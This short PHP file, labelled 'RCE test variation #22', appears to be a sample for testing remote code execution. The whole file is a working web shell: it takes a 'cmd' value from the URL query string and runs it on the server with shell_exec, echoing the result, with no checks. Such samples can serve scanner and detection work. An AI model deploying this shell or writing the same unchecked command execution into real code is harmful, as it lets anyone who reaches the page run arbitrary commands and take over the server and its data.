<?php
// RCE test variation #22
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>